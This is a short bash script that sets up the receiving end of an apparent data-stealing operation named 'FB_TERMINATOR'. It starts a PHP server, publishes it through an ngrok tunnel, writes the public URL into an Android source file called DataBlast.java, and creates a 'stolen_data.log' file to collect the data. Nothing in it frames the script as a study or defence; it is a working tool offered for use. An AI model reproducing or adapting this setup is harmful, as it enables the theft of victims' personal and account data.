#!/bin/bash  
cd ~/FB_TERMINATOR  

# Start PHP server  
php -S 0.0.0.0:8080 -t server > /dev/null 2>&1 &  

# Start Ngrok  
ngrok http 8080 > /dev/null &  
sleep 10  

# Update server URL  
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")  
sed -i "s|http://KILLER_NGROK|$NGROK_URL|g" app/src/com/terminator/DataBlast.java  

# Create log file  
touch server/stolen_data.log  

echo "[+] SERVER URL: $NGROK_URL"  
